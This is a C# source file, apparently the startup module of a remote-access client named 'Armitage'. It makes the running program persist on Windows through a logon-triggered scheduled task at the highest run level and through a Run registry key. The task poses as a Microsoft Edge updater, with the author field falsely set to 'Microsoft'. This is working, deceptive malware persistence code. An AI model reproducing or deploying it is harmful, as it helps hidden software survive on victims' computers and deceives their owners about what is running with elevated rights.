using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Armitage.Startup
{
    /// <summary>
    /// A class containing methods to attach itself at startup.
    /// </summary>
    public static class Task_Scheduler
    {
        private static RegistryKey RegistryStartupFolder =
            Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

        /// <param name="filepath">If null, uses current process' file path.</param>
        public static bool ViaTaskScheduler(string name, string filepath = null)
        {
            try
            {
                if (filepath == null) filepath = Constants.MyPath;

                // Microsoft.Win32.TaskScheduler.LogonTrigger t = new LogonTrigger();
                TaskService ts = new TaskService();

                try // sometimes this just happens
                {
                    // if the task already exists, remove it, but will be replaced
                    var atask = ts.GetTask(name);

                    if (atask != null) ts.RootFolder.DeleteTask(name);
                }
                catch { }

                // replace
                TaskDefinition td = ts.NewTask();

                td.RegistrationInfo.Description = "Keeps Microsoft Edge up to date.";

                td.RegistrationInfo.Author = "Microsoft";

                td.Principal.RunLevel = TaskRunLevel.Highest;

                td.Settings.Priority = System.Diagnostics.ProcessPriorityClass.Normal;

                td.Triggers.Add(new LogonTrigger
                {
                    Enabled = true
                });

                var action = new ExecAction { Path = filepath, WorkingDirectory = Path.GetDirectoryName(filepath) };

                td.Actions.Add(action);

                ts.RootFolder.RegisterTaskDefinition(name, td);

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());

                return false;
            }
            return true;
        }
        public static bool ViaRegistry()
        {
            try
            {
                RegistryStartupFolder.SetValue(Constants.MMCTaskName,
                    Constants.MyPath);
                RegistryStartupFolder.Flush();
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
            return false;
        }

        public static bool RemoveOldRegistryStartupKey()
        {
            try
            {
                RegistryStartupFolder.DeleteValue(Constants.MMCTaskName,
                    false);
                RegistryStartupFolder.Flush();
                return true;
            }
            catch
            {

            }
            return false;
        }
        public static bool IsOldStartupExist()
        {
            return RegistryStartupFolder.GetValue(Constants.MMCTaskName) != null;
        }
        public static bool IsTaskExists(string taskname)
        {
            return TaskService.Instance.GetTask(taskname) != null;
        }
        public static bool RemoveTask(string name)
        {
            try
            {
                TaskService.Instance.GetTask(Constants.MMCTaskName).Enabled = false;
                return true;
            }
            catch
            {
            }
            return false;
        }
    }
}
